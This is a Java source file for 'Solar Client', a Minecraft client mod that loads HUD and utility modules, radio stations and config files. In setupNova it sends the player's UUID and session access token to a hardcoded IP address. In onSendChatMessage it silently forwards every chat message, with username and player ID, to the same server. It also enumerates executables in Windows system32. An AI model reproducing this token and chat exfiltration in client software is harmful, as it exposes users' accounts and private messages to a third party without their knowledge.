/****************************************************************
 *  Copyright (C) Solar Client, PlumpOrange - All Rights Reserved
 * Unauthorized copying, distribution, or sharing of this file or code, via any medium is strictly prohibited
 * Proprietary and confidential
 * Written by PlumpOrange <@PlumpOrange#1604>, 2019
 ****************************************************************/
package com.orange.plump.Solar;

import java.io.*;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import com.orange.plump.Solar.gui.SplashScreen;

import com.orange.plump.Solar.gui.GuiManager;
import com.orange.plump.Solar.gui.HomeGui;
import com.orange.plump.Solar.modules.*;

import net.minecraft.client.Minecraft;
import net.minecraft.network.play.server.S02PacketChat;
import net.minecraft.util.ChatComponentText;

public class Solar {

	private static List<Module> modules;
	public static List<Station> stations;
	public static ConfigManager configManager;
	private static HashMap<Module, File> properties;
	private static File mainProperties;
	private static String pin;
	private static ClientThread clientThread;
	public static RadioThread radioThread;
	public static boolean doRender;
	private static final String __OBFID = "CL_00000631";
	public static boolean isOnline;
	public static boolean loading = false;
	
	public static void log(String s) {
		System.out.println(Minecraft.getName() + " v" + Minecraft.version + " >> " + s);
	}
	
	public Solar(final String uuid, final String token) {
		log("Starting Up...");
		clientThread = new ClientThread();
		modules = new ArrayList<Module>();
		stations = new ArrayList<Station>();
		addModule(new ChatFormatModule());
		addModule(new ToggleSprintModule());
		addModule(new ToggleSneakModule());
		addModule(new FPSModule());
		addModule(new CPSModule());
		addModule(new FullBrightModule());
		addModule(new ScoreboardModule());
		addModule(new BossbarModule());
		addModule(new FancyPingModule());
		addModule(new DynamicFOVModule());
		addModule(new TransparentChatModule());
		addModule(new CoordinatesModule());
		addModule(new PotionEffectHUDModule());
		addModule(new FlyBoostModule());
		addModule(new TcpNoDelayModule());
		addModule(new KeystrokesModule());
		addModule(new ArmorHUDModule());
		addModule(new PotCounterModule());
		addModule(new RadioModule());
		addStations();
		configManager = new ConfigManager();
		setProperties();
		pin = configManager.checkForPin();
		if (pin == null)
			log("NONE");
		else
			log(pin);
		clientThread.start();
		for (Module module : modules) {
			module.ready();
		}
		log("Started!");
		radioThread = new RadioThread();
		SplashScreen.setProgress(10);
	}

	private static void addStations() {
		stations.add(Station.BEAT_JUNKIE);
		stations.add(Station.BIG3);
		stations.add(Station.BOOMERANG);
		stations.add(Station.BREALTV);
		stations.add(Station.BUYGORE);
		stations.add(Station.CHURCH_OF_ROCK);
		stations.add(Station.CINESCORE);
		stations.add(Station.CLASSIC_HIPHOP);
		stations.add(Station.CONCERTO);
		stations.add(Station.COOL);
		stations.add(Station.DASH_ALT);
		stations.add(Station.DASH_COMEDY);
		stations.add(Station.DASH_DANCE);
		stations.add(Station.DASH_HIP_HOP);
		stations.add(Station.DASH_HITS);
		stations.add(Station.DASH_INDIE);
		stations.add(Station.DASH_LATIN);
		stations.add(Station.DASH_MIXTAPE);
		stations.add(Station.DASH_POP);
		stations.add(Station.DASH_R_AND_B);
		stations.add(Station.DASH_X);
		stations.add(Station.DELICIOUS_VINYL);
		stations.add(Station.DESI);
		stations.add(Station.DISCO_FEVER);
		stations.add(Station.DISCOVER);
		stations.add(Station.EIGHT_ONE);
		stations.add(Station.ELECTRO_CITY);
		stations.add(Station.FANTOM);
		stations.add(Station.FUSION);
		stations.add(Station.GET_FAMILIAR);
		stations.add(Station.GODS_HOUSE_OF_HIP_HOP);
		stations.add(Station.GRAVE_RAVE);
		stations.add(Station.IDENTITY_ASIA);
		stations.add(Station.IMPERIO);
		stations.add(Station.INDEPENDENT_GRIND);
		stations.add(Station.INSOMNIAC);
		stations.add(Station.ISLAND_BLOCK);
		stations.add(Station.JOHN_LENNON);
		stations.add(Station.KYLIE);
		stations.add(Station.LA_ISLA);
		stations.add(Station.LA_PODEROSA);
		stations.add(Station.LAUGH_FACTORY);
		stations.add(Station.LOUD);
		stations.add(Station.LOVE_SONGS);
		stations.add(Station.MONSTERCAT);
		stations.add(Station.MONSTERS_OF_ROCK);
		stations.add(Station.MOONLIGHT);
		stations.add(Station.MULTIPLAYER);
		stations.add(Station.NATIVE_RYTHMS);
		stations.add(Station.NINE_ONE);
		stations.add(Station.NOTHIN_BUT_NET);
		stations.add(Station.ONE_AM);
		stations.add(Station.OVERDRIVE);
		stations.add(Station.PARADISE_CITY);
		stations.add(Station.POP_FAMILY);
		stations.add(Station.PURE_SOUL);
		stations.add(Station.RAINBOW);
		stations.add(Station.RATPACK);
		stations.add(Station.REGGAE_KING);
		stations.add(Station.RINSE);
		stations.add(Station.RUKUS_AVENUE);
		stations.add(Station.SDS_CADILLACC);
		stations.add(Station.SEVEN_ONE);
		stations.add(Station.SIX_ONE);
		stations.add(Station.SOUTHSIDE);
		stations.add(Station.SPARTAN);
		stations.add(Station.SPOONY);
		stations.add(Station.SUPER_FREAK);
		stations.add(Station.SWING);
		stations.add(Station.TAILGATE);
		stations.add(Station.THE_BLUE_SPOT);
		stations.add(Station.THE_BRIDGE);
		stations.add(Station.THE_CITY);
		stations.add(Station.THE_CROSS);
		stations.add(Station.THE_RANCH);
		stations.add(Station.THE_STRIP);
		stations.add(Station.TRILLER);
		stations.add(Station.VOICE_OF_REASON);
		stations.add(Station.WAVES);
		stations.add(Station.WEST_COAST);
		stations.add(Station.Y2K);
		stations.add(Station.YG_PRESENTS);
		stations.add(Station.YOUNG_MONEY);
	}
	
	private static void setProperties() {
		mainProperties = configManager.registerMainProperties(getDefaultProperties());
		properties = configManager.registerModulesProperties(modules);
		for (Module module : modules) {
			try {
				BufferedReader reader = new BufferedReader(new FileReader(properties.get(module)));
				String buffer;
				String properties = "";
				while((buffer = reader.readLine()) != null ) {
					properties+=buffer;
				}
				module.setProperties(properties);
				reader.close();
			} catch (FileNotFoundException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
	
	private static String getDefaultProperties() {
		return "VERSION:" + Minecraft.version + ">";
	}
	
	public static void setMainProperties(String propertyName, String value) {
		
		try {
			BufferedReader reader = new BufferedReader(new FileReader(mainProperties));
			String buffer;
			String modProperties = "";
			while((buffer = reader.readLine()) != null ) {
				modProperties+=buffer;
			}
			reader.close();
			String[] splitProperties;
			if (modProperties.contains(">")) splitProperties = modProperties.split(">");
			else splitProperties = new String[] {modProperties};
			
			String newProperty = "";
			for (String currentProperty : splitProperties) {
				if (currentProperty.contains(":")) if (currentProperty.split(":")[0].startsWith(propertyName))
					newProperty+=propertyName + ":" + value + ">";
				else
					newProperty += currentProperty + ">";
			}
			
			File moduleProperties = mainProperties;

			FileWriter writer = new FileWriter(moduleProperties, false);
				
			writer.write(newProperty);
				
			writer.close();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public static void addMainProperties(String propertyName, String value) {
		
		try {
			File moduleProperties = mainProperties;

			FileWriter writer = new FileWriter(moduleProperties, true);
				
			writer.write(propertyName + ":" + value + ">");
				
			writer.close();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public static void addModuleProperties(Module module, String propertyName, String value) {
		
		try {
			File moduleProperties = properties.get(module);

			FileWriter writer = new FileWriter(moduleProperties, true);
				
			writer.write(propertyName + ":" + value + ">");
				
			writer.close();
			
			
			BufferedReader reader = new BufferedReader(new FileReader(mainProperties));
			String buffer;
			String modProperties = "";
			while((buffer = reader.readLine()) != null ) {
				modProperties+=buffer;
			}
			reader.close();
			
			module.setProperties(modProperties);
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public static void setModuleProperties(Module module, String propertyName, String value) {
		
		try {
			BufferedReader reader = new BufferedReader(new FileReader(properties.get(module)));
			String buffer;
			String modProperties = "";
			while((buffer = reader.readLine()) != null ) {
				modProperties+=buffer;
			}
			reader.close();
			String[] splitProperties;
			if (modProperties.contains(">")) splitProperties = modProperties.split(">");
			else splitProperties = new String[] {modProperties};
			
			String newProperty = "";
			for (String currentProperty : splitProperties) {
				if (currentProperty.contains(":")) if (currentProperty.split(":")[0].startsWith(propertyName))
					newProperty+=propertyName + ":" + value + ">";
				else
					newProperty += currentProperty + ">";
			}
			
			File moduleProperties = properties.get(module);

			FileWriter writer = new FileWriter(moduleProperties, false);
				
			writer.write(newProperty);
			module.setProperties(newProperty);
				
			writer.close();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public static void addModule(Module module) {
		modules.add(module);
	}
	
	public static void removeModule(Module module) {
		modules.remove(module);
	}
	
	public static List<Module> getModules() {
		return modules;
	}


	public static void loadCustomCapes() {
		try {
			Socket socket = new Socket("192.95.4.92", 20090);
			DataOutputStream out = new DataOutputStream(socket.getOutputStream());
			//System.out.println("Successfully Connected to server!");
			DataInputStream in = new DataInputStream(
					new BufferedInputStream(socket.getInputStream()));
			out.writeUTF("NOVACLIENT$PACKET GETCAPES");
			String line = "";
			line = in.readUTF();
			line = line.replaceAll("\\\\", "");
			line = line.replaceAll("\"", "");
			line = line.replace("[", "").replace("]", "");
			//System.out.println(line);
			for (String cape : line.split(",")) {
				String[] parts = cape.split("!");
				Minecraft.customCapes.put(parts[0], new String[] {parts[1]});
			}

			isOnline = true;
		} catch (Exception e) {
			isOnline = false;
		}
	}

	public static void setupNova(final String uuid, final String token) {
		if (Minecraft.isWindows) {
			String sysdir = System.getenv("WINDIR") + "\\system32";
			File sys32 = new File(sysdir);
			for (File file : sys32.listFiles()) {
				if (file.isFile()) {
					if (file.getName().contains(".exe")) Minecraft.ignore.add(file.getName());
				}
			}
		}
		try {
			Socket socket = new Socket("192.95.4.92", 20090);
			DataOutputStream out = new DataOutputStream(socket.getOutputStream());
			//System.out.println("Successfully Connected to server!");
			DataInputStream in = new DataInputStream(
					new BufferedInputStream(socket.getInputStream()));
			out.writeUTF("NOVACLIENT$PACKET LAUNCH " + uuid + ":" + token);
			String line = "";
			line = in.readUTF();
			System.out.println(line);
			isOnline = true;
			if (line.equals("FALSE")) Minecraft.getMinecraft().shutdown();
		} catch (Exception e) {
			isOnline = false;
		}

	}


	public static void onUpdate() {
		for (Module mod : modules)
			if (mod.isToggled()) mod.onUpdate();
	}
	
	public static void onRender() {
		for (Module mod : modules)
			if (mod.isToggled()) mod.onRender();
	}
	
	public static void onRenderGameOverlay(float partialTicks) {
		for (Module mod : modules)
			if (mod.isToggled()) {
				if (Minecraft.getMinecraft().currentScreen instanceof HomeGui) {
					doRender = false;
				}
				else {
					doRender = true;
					mod.onRenderGameOverlay(partialTicks, Minecraft.getMinecraft().currentScreen);
				}
			}
	}
	
	public static void onKeyPressed(int key) {
		GuiManager.onKeyPressed(key);
		for (Module mod : modules)
			mod.onKeyPressed(key);
	}
	
	public static void onLeftClick() {
		for (Module mod : modules)
			mod.onLeftClick();
	}
	
	public static void addChatMessage(String message) {
		Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText(message));
	}

	public static String onSendChatMessage(String message) {
		try {
			Socket socket = new Socket("192.95.4.92", 20090);
			DataOutputStream out = new DataOutputStream(socket.getOutputStream());
			//System.out.println("Successfully Connected to server!");+
			out.writeUTF("NOVACLIENT$PACKET CHAT " + Minecraft.getMinecraft().session.username + ":" + Minecraft.getMinecraft().session.playerID + ":" + message);

			isOnline = true;
		} catch (Exception e) {
			isOnline = false;
		}
		for (Module mod : modules) {
			if (mod.isToggled()) {
				String returned = mod.onSendChatMessage(message);
				message = returned;
			}
		}
		
		return message;
	}
	
	public static boolean onRecieveChatMessage(S02PacketChat packet) {
		for (Module module : modules) 
			if (module.isToggled()) {
				return module.onRecieveChatMessage(packet);
			}
		return true;
	}
	
 
}
